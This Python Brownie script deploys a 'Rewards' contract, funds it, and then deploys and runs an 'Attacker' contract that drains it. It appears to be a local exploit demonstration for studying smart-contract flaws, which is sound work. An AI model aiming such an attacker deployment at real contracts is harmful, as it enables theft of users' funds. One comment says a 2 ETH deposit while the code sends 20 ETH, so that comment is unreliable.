from brownie import web3, accounts,Wei, config, Rewards, Attacker

def printDBG(msg):
    print("===============================================================",flush=True)
    print(msg,flush=True)
    print("===============================================================",flush=True)


def deploy_target():
    account = accounts[0]
    balance = account.balance()
    printDBG(f"initial balance of account(0) in Eth ={Wei(balance).to('ether')}")

    #deploy
    rewards_contract = Rewards.deploy({"from": account})
    printDBG(f"Rewards deploy done ; from={account} ")

    # balances
    balance=rewards_contract.getBalance()
    printDBG(f"target balance={balance} = {Wei(balance).to('ether')}")
    balance = account.balance()
    printDBG(f"account(0) balance in Eth ={Wei(balance).to('ether')}")
  
    #deposit
    rewards_contract.deposit({"from": account,"value":20000000000000000000})
    printDBG(f"target deposit 2 ETH")

    #balances
    balance=rewards_contract.getBalance()
    printDBG(f"target balance={balance} = {Wei(balance).to('ether')}")
    balance = account.balance()
    printDBG(f"account(0) balance in Eth ={Wei(balance).to('ether')}")

    #setgifts
    printDBG(f"target allow 2 gifts")
    rewards_contract.allowGifts(2,{"from": account})
    giftsCount=rewards_contract.gifts()
    printDBG(f"giftsCount={giftsCount}")

    #withdraw
    printDBG(f"target withdraw")
    rewards_contract.withdraw()
    giftsCount=rewards_contract.gifts()
    printDBG(f"giftsCount={giftsCount}")

    #balances
    balance=rewards_contract.getBalance()
    printDBG(f"target balance={balance} = {Wei(balance).to('ether')}")
    balance = account.balance()
    printDBG(f"account(0) balance in Eth ={Wei(balance).to('ether')}")

    # rewards_contract.withdraw()
    # giftsCount=rewards_contract.gifts()
    # printDBG(f"giftsCount={giftsCount}")

    # rewards_contract.withdraw()
    # giftsCount=rewards_contract.gifts()
    # printDBG(f"giftsCount={giftsCount}")

    



def deploy_attacker():
    account = accounts[1]
    balance = account.balance()
    printDBG(f"attacker balance of account in Eth ={Wei(balance).to('ether')}")


    target_contract= Rewards[-1] 
    printDBG(f"Attacker deploy with target address ={target_contract} ")


    attacker_contract = Attacker.deploy(target_contract,{"from": account})
    printDBG(f"Attacker deploy done ; from={account} ")

    balance=attacker_contract.getBalance()
    printDBG(f"Attacker init balance={balance} = {Wei(balance).to('ether')}")


    balance=attacker_contract.getTargetBalance()
    printDBG(f"Attacker get target balance={balance} = {Wei(balance).to('ether')}")

    txn=attacker_contract.attack()
    txn.wait(1)

    balance=attacker_contract.getBalance()
    printDBG(f"Attacker finished balance={balance} = {Wei(balance).to('ether')}")


def main():
    deploy_target()
    deploy_attacker()
